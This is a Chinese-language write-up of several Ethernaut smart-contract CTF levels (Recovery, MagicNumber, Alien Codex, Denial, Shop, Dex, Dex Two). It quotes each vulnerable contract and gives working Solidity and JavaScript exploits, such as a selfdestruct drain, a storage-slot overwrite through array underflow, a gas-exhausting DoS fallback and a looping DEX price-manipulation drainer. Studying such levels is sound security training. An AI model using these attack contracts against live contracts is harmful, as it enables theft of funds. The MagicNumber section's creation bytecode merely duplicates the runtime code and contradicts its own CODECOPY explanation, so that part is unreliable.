
const computedAddress = ethers.utils.getContractAddress({
    from: recoveryAddress,
    nonce: nonce
});

console.log('丢失的 SimpleToken 合约地址:', computedAddress);
```
- 与丢失的合约交互：一旦我们知道了地址，就可以与 SimpleToken 合约交互。由于 destroy 函数是公共的，我们可以调用它来触发 selfdestruct，将合约持有的以太币发送到我们指定的地址。

此外，也可以在 etherscan 上找到合约地址：0xF8a061d1a76A071FB6c314609b0bb91A36C8Ee64 和上面的函数计算结果一致。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISimpleToken {
    function destroy(address payable _to) external;
}

contract Attack {
    function attack() public {
        address payable to = payable(address(0xA5d69166aD38B3403FE7894B0FBDA83A6026767C));
        ISimpleToken(payable(0xF8a061d1a76A071FB6c314609b0bb91A36C8Ee64)).destroy(to);
    }
}
```

补充：地址计算的 RLP 编码 keccack256(RLP_encode(address, nonce))，这里的 nonce 从 1 开始计算（因为合约自身创建 nonce 从变为了 1）
```
[
  0xC0
    + 1 (a byte for string length) 
    + 20 (string length itself) 
    + 1 (nonce), 
  0x80
    + 20 (string length),
  <20 byte string>,
  <1 byte nonce>
]

[0xD6, 0x94, <challengeInstance>, 0x01]
```

# MagicNumber
- 这道题有点难，看 wp 学习的，不会手写 Opcode。
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MagicNum {
    address public solver;

    constructor() {}

    function setSolver(address _solver) public {
        solver = _solver;
    }

    /*
    ____________/\\\_______/\\\\\\\\\_____        
     __________/\\\\\_____/\\\///////\\\___       
      ________/\\\/\\\____\///______\//\\\__      
       ______/\\\/\/\\\______________/\\\/___     
        ____/\\\/__\/\\\___________/\\\//_____    
         __/\\\\\\\\\\\\\\\\_____/\\\//________   
          _\///////////\\\//____/\\\/___________  
           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
            ___________\///_____\///////////////__
    */
}
```
题目要求我们实现一个可以在 whatIsTheMeaningOfLife() 调用时返回正确的 32 字节数的合约【注释里提示了是42】，同时限制代码长度。这个题需要写一个 solver 合约，最多10字节（如果通过solidity写一个function也会超过10个字节）。题目提示我们需要离开 solidity 直接写 EVM Opcode 来满足功能。

部署合约的字节码进一步可以分为：Creation Code（不包含进合约内，仅部署时执行）、Runtime Code。Constructor 中的逻辑就在 Creation Code。

对于 Creation Code：
- OPCODE: 0x60  NAME: PUSH1
- OPCODE: 0x52  NAME: MSTORE
- OPCODE: 0xf3  NAME: RETURN
- OPCODE: 0x39  NAME: CODECOPY


先构造 runtime code：目标是返回42即(0x2a),需要用到 return(p,s) 操作码，p是回传值在memory中的位置，s是回传值的大小，所以0x2a需要先存到memory中然后再return，于是用到 MSTORE(p,v)。
```
PUSH1 0x2a
PUSH1 0x80 // 这里可以是任意值，通常 solidity 编译出的 opcode 这里是 0x80，因为之前的位置有别的用途，但手写 opcode 无所谓了
MSTORE

PUSH1 0x20 // 32 bytes - RETURN(p,s) - s - size
PUSH1 0x80 // p - 上面 mstore 的地址
RETURN
```
翻译成opcode：`602a60805260206080f3` 20 chars 刚好 10 bytes 

然后写 creation code。需要完成的操作有：将 runtime code 加载到内存中，然后返回给 EVM。CODECOPY 操作码可以实现这个功能，CODECOPY(d,p,s) 需要三个参数：runtime code position in memory，current position of runtime opcode in the bytecode 和 size of the code in bytes。 回传给 EVM 需要用到： return(p,s);

故构造如下：
```
PUSH1 s // 0x0a - 10 bytes - size of runtime opcode 和前面的 code 长度一致
PUSH1 p // 
PUSH1 d // dst position: 0x00 可以随便设
CODECOPY
// CODECOPY(d,p,s)
PUSH1 s // 和上面一致 0x0a
PUSH1 p // 和上面一致 0x00
RETURN
// return(p,s)
```

翻译成 bytecode:
```
602a60805260206080f3
```
组合一下：
```
602a60805260206080f3 + 602a60805260206080f3
602a60805260206080f3602a60805260206080f3
```

部署：
```solidity
bytecode = "602a60805260206080f3602a60805260206080f3"
txn = await web3.eth.sendTransaction({from: player, data: bytecode})
await contract.setSolver(txn.contractAddress)
```
这里不止一种构造方式。

参考资料：
- [Learn EVM in depth #2. Executing the bytecode step by step in the deployment of a contract.](https://medium.com/coinmonks/learn-evm-in-depth-2-executing-the-bytecode-step-by-step-in-the-deployment-of-a-contract-270a6335df75)
- [https://www.evm.codes/playground](https://www.evm.codes/playground)

# Alien Codex
- 本题参考资料：[ABI docs](https://docs.soliditylang.org/en/v0.4.21/abi-spec.html)
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
```
目标是夺取合约控制权（即将 owner 状态变量设置为我们的地址，这个变量来自继承的 Ownable 合约）。在 Solidity 0.5.0 之前，动态数组的长度是可修改的，codex.length-- 可以将数组长度减少。当数组长度减少到零以下时，会发生什么？在 Solidity 0.5.0 之前，codex.length-- 可能导致数组长度下溢，从而变成一个非常大的数。

Solidity 中的存储是连续的，数组的元素紧跟在数组的起始位置之后。如果我们能够计算出存储槽的位置，就有可能覆盖其他状态变量。

- Solidity 存储布局： 在 Solidity 中，状态变量在存储中的布局遵循以下原则：
    - 每个状态变量存储在256位（32字节）的存储槽（slot）中。状态变量按照声明的顺序存储。 继承的合约优先。
    - 如果多个状态变量的大小加起来不超过32字节，它们可以打包存储在同一个slot中。
    - 动态大小的类型（如数组、映射）会占用单独的slot来存储指向其数据的指针。
    - 动态数组（如 bytes32[]）的存储方式：数组的长度存储在一个槽中，其位置通过 keccak256(数组槽位置) 计算得到。数组的元素从计算得到的槽位置开始顺序存储。
```
array[0] = keccak256(uint256(slot)) + 0
array[1] = keccak256(uint256(slot)) + 1
...
array[MAX] = keccak256(uint256(slot)) + 2 ^ 256
```

```js
await web3.eth.getStorageAt("0x46bd82aBEe5DE33DadcE904DF892cdD1789EF2e7",0)
'0x0000000000000000000000000bc04aa6aac163a6b3667636d798fa053d43bd11'
await web3.eth.getStorageAt("0x46bd82aBEe5DE33DadcE904DF892cdD1789EF2e7",1)
'0x0000000000000000000000000000000000000000000000000000000000000000'
await web3.eth.getStorageAt("0x46bd82aBEe5DE33DadcE904DF892cdD1789EF2e7",2)
'0x0000000000000000000000000000000000000000000000000000000000000000'
```
ownable 里有一个 owner 变量（address 类型，20 bytes）。然后 AlienCodex 里有俩变量（bool，bytes32[]）。根据上面的介绍，显然 address、bool在slot0，动态数组在slot1。这里我们还可以验证一下：
```js
await web3.eth.getStorageAt("0x46bd82aBEe5DE33DadcE904DF892cdD1789EF2e7",0)
'0x0000000000000000000000010bc04aa6aac163a6b3667636d798fa053d43bd11'
                          ⬆️ 这里变成了1 0bc04aa6aac163a6b3667636d798fa053d43bd11 刚好40个chars，20bytes
                        bool, address
```
证明我们分析的正确性。 所以 codex 数组的起始槽位置为 1。数组元素的存储起始位置为 keccak256(1)。可以通过计算覆盖到其他存储槽。
已知 array[0] = keccak256(uint256(1)) + 0，我们想要访问 slot 0，array[x] = 0 = keccak256(uint256(1)) + x
=> x = 0 - keccak256(uint256(1)) =  2^256 - keccak256(uint256(1)) = 2^256-1-keccak256(uint256(1))+1

```solidity
uint256 public index = uint256(0) - uint256(keccak256(abi.encodePacked(uint256(1)))); // 需要用低版本的 solidity
// or
uint256 public index2 = (2**256 - 1) - uint256(keccak256(abi.encodePacked(uint256(1)))) + 1;
// 35707666377435648211887908874984608119992236509074197713628505308453184860938
// 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a
```
但直接 revise player 地址也会有问题，因为 bytes[] 是大端序，这个数据会写到 0x前半截，而我们知道存储布局 owner 在slot0 0x....address的尾部。所以需要对player填充前导0。

POC:
```solidity
await contract.retract() // codex underflow
await contract.revise("0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a", web3.utils.padLeft(player, 64))
```

# Denial
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```
题目要求是：阻止合约的所有者在调用 withdraw() 函数时提取资金，条件是合约仍然有余额并且调用时的 gas 消耗不超过 1M gas。这是一个经典的 Dos(denial of service) 问题。

题目提供的合约是一个简单的钱包合约，主要功能是将合约中的资金按比例（1%）分发给 partner（合伙人）和合约的所有者 owner。主要流程如下：
1. 合约拥有者可以调用 setWithdrawPartner() 设置合伙人地址。
2. 调用 withdraw() 函数时，合约中的 1% 余额会分别发给 partner 和 owner，即 partner 得到一部分资金，owner 得到另一部分。
3. withdraw() 函数中首先使用 partner.call{value: amountToSend}("") 将资金发送给合伙人，紧接着调用 payable(owner).transfer(amountToSend) 将资金发送给合约的 owner。

题目要求是通过某种方式阻止合约 owner 从合约中提取资金，但合约中的资金仍然存在。这意味着我们需要在 withdraw() 函数中让 payable(owner).transfer() 无法成功完成。可以通过利用 partner.call{value: amountToSend}("") 来消耗大量的gas，使得 payable(owner).transfer() 没有足够的gas执行。 call() 方法没有限制 gas 的使用，允许消耗大量的gas，而 transfer() 默认只能使用 2300 gas。如果 partner.call() 消耗了足够多的 gas，payable(owner).transfer() 就会因为gas不足而失败。将我们自己的合约设为 partner，在我们的合约中设计一种方法，消耗大量的gas，从而阻止 owner 提取资金。

POC:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    fallback() external payable {
        while(true){}
    }
}
```
```js
await contract.setWithdrawPartner("0x096fb29B3474Fe58D8da00d52EAB27eF9b75Bb02")
```

# Shop
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
```
这个和之前做过的题有点像，第一次返回一个大于price的值，第二次返回一个小的值。但这个题和之前的不同的一点是函数是 view 修饰的。view 不能修改合约状态。所以看起来不能用之前的思路做了？但是 Buyer 合约可以反过来查询 Shop 的 isSold 状态，这样 buyer 就没有进行任何修改也可以改变 flag。
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IShop {
    function isSold() external view returns (bool);
    function buy() external;
}


contract Buyer {
    IShop shop = IShop(0x9543f67A97E33b4209CCBfe92A0370D98E1E3245);

    function price() public view returns (uint256) {
        if (shop.isSold()) return 1;
        else return 100;
    } 

    function attack() public {
        shop.buy();
    }
}
```

# Dex
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

contract Dex is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
```
合约的两个主要函数是 swap（代币交换）和 getSwapPrice（获取代币的交换价格）。合约允许用户交换 token1 和 token2，并根据每种代币在合约中的余额来动态调整它们的价格。价格的计算方式为：amount * toTokenBalance / fromTokenBalance，也就是说，价格取决于代币在合约中的相对余额。目标是通过价格操纵攻击搞走token。
初始条件：你有 10 个 token1 和 10 个 token2。DEX 合约中有 100 个 token1 和 100 个 token2。

在 etherscan 可以看到：https://sepolia.etherscan.io/tx/0x19abeef36016d40f68cedeb6cf4ecb76c7e1bce9600473928682777ec45394c1
- DEX: 0x30469eb59016b840DA21b1d36d50f7A9e436a2B9
- Token1: 0x0ab849721138d22725d0f6cf73874b0fabef5641
- Token2: 0xa970f48909537a0909d15093bbebb581dbadd7b8

第一次做这种题，先手算一下：
```
EXP

a：10， b:10
A:100,    B:100

Swap1: 10a->b

10*100=100*output => output=10

a:0, b:20
A:110, B:90

Swap2: 20b->a

20*110=90*output => output = 20*110//90 = 24

a:24  b:0
A:86,  B:110

Swap3: 24a->b

24*110=86*output => output = 30

a:0, b:30
A: 110, B: 80

Swap4: 30b->a

output = 30*110/80=41

a:41, b:0
A:69, B: 110

Swap5: 41a->b

Output = 110*41/69=65

a:0,b:65
A:110,B:45

Swap6: 65b->a

Output=110*65/45=158 > 110 Revert

```
结论是大概第6次就可以换完。但直接全换回导致最后余额不够，revert。所以需要构造刚好第6次换能等于110。所以不必每次都换完。
```
a:0,b:65
A:110,B:45

Swap6: 65b->a

Output=110*65/45=158 > 110 Revert

重新思考这里，稍微修改一下：

a:0,b:65
A:110,B:45

Swap6: 45b->a

Output=110*45/45=110 提取全部

思考上面这个构造，本质上是我拥有的一个token的数量大于了合约里对应的token，所以可以用相同的token数量把他换光。于是得到了POC。
```
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./dex.sol";
import "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract DexAttack {
    Dex public dex;
    IERC20 public token1;
    IERC20 public token2;

    constructor(address _dex, address _token1, address _token2) {
        dex = Dex(_dex);
        token1 = IERC20(_token1);
        token2 = IERC20(_token2);
    }

    function attack() public {
        // 批准 dex 使用 token1 和 token2
        token1.approve(address(dex), type(uint256).max);
        token2.approve(address(dex), type(uint256).max);

        // 第一步：用 10 个 token1 换 10 个 token2
        dex.swap(address(token1), address(token2), 10); 

        // 循环操作，直到合约中的一种代币被耗尽
        while (token1.balanceOf(address(dex)) > 0 && token2.balanceOf(address(dex)) > 0) {
            uint256 dexToken1Balance = token1.balanceOf(address(dex));
            uint256 dexToken2Balance = token2.balanceOf(address(dex));

            uint256 myToken1Balance = token1.balanceOf(address(this));
            uint256 myToken2Balance = token2.balanceOf(address(this));

            // 检查持有代币的数量是否大于 DEX 中相应的代币数量
            if (myToken1Balance >= dexToken1Balance) {
                dex.swap(address(token1), address(token2), dexToken1Balance);
                break;
            } else if (myToken2Balance >= dexToken2Balance) {
                dex.swap(address(token2), address(token1), dexToken2Balance);
                break;
            }

            // 选择较小余额的代币进行交换，以操纵价格
            if (dexToken1Balance > dexToken2Balance) {
                dex.swap(address(token2), address(token1), myToken2Balance);
            } else {
                dex.swap(address(token1), address(token2), myToken1Balance);
            }
        }
    }
}
```
部署攻击合约，然后通过 at address 加载两个token合约，先把token转给攻击合约。然后点击 attack 即可。
- 这个题我看网上题解好像都是手算然后硬编码的hhh，我感觉我这个POC通用一点。

# Dex Two
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

contract DexTwo is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function add_liquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapAmount(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableTokenTwo is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
```
- 对上一题略微修改，要求同时耗尽 token1 和 token2 中的资产。